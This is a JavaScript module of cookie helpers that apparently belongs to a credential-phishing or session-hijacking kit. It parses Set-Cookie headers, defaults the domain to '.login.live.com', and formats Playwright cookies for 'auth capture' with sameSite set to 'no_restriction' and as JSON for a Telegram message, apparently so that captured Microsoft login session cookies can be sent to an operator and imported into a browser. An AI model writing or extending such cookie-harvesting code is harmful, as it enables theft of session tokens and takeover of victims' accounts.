/**
 * Cookie Utilities
 * Functions for extracting and formatting cookies
 */

/**
 * Extract cookies from HTTP response
 * @param {Object} response - HTTP response object
 * @returns {Array<Object>} Array of cookie objects
 */
function extractCookiesFromResponse(response) {
    try {
        const cookies = [];
        
        if (response && response.headers) {
            const setCookieHeaders = response.headers['set-cookie'] || [];
            
            setCookieHeaders.forEach(cookieHeader => {
                try {
                    const parts = cookieHeader.split(';');
                    const mainPart = parts[0].trim();
                    const [name, value] = mainPart.split('=');
                    
                    if (name && value) {
                        const cookie = {
                            name: name.trim(),
                            value: value.trim(),
                            domain: response.url ? new URL(response.url).hostname : '.login.live.com',
                            path: '/',
                            httpOnly: cookieHeader.toLowerCase().includes('httponly'),
                            secure: cookieHeader.toLowerCase().includes('secure')
                        };
                        
                        // Extract expires if present
                        const expiresPart = parts.find(part => part.toLowerCase().includes('expires='));
                        if (expiresPart) {
                            const expires = new Date(expiresPart.split('=')[1].trim());
                            cookie.expires = expires.getTime();
                        }
                        
                        cookies.push(cookie);
                    }
                } catch (cookieError) {
                    console.log(`⚠️ Error parsing cookie: ${cookieError.message}`);
                }
            });
        }
        
        console.log(`🍪 Extracted ${cookies.length} cookies from response`);
        return cookies;
    } catch (error) {
        console.error('❌ Error extracting cookies:', error.message);
        return [];
    }
}

/**
 * Format cookies from Playwright context for storage
 * @param {Array<Object>} cookies - Playwright cookies
 * @returns {Array<Object>} Formatted cookies
 */
function formatCookiesForStorage(cookies) {
    return cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        httpOnly: cookie.httpOnly || false,
        secure: cookie.secure || false,
        expirationDate: cookie.expires ? Math.floor(cookie.expires * 1000) : undefined
    }));
}

/**
 * Format cookies for Telegram message
 * @param {Array<Object>} cookies - Cookie objects
 * @returns {string} Formatted cookie string
 */
function formatCookiesForTelegram(cookies) {
    return JSON.stringify(cookies, null, 2);
}

/**
 * Format cookies from Playwright context (used in auth detection)
 * @param {Array<Object>} cookies - Playwright cookies
 * @returns {Array<Object>} Formatted cookies
 */
function formatCookiesForAuthCapture(cookies) {
    return cookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path,
        httpOnly: cookie.httpOnly,
        secure: cookie.secure,
        expires: cookie.expires && cookie.expires > 0 ? Math.floor(cookie.expires * 1000) : 0,
        sameSite: "no_restriction"
    }));
}

module.exports = {
    extractCookiesFromResponse,
    formatCookiesForStorage,
    formatCookiesForTelegram,
    formatCookiesForAuthCapture
};

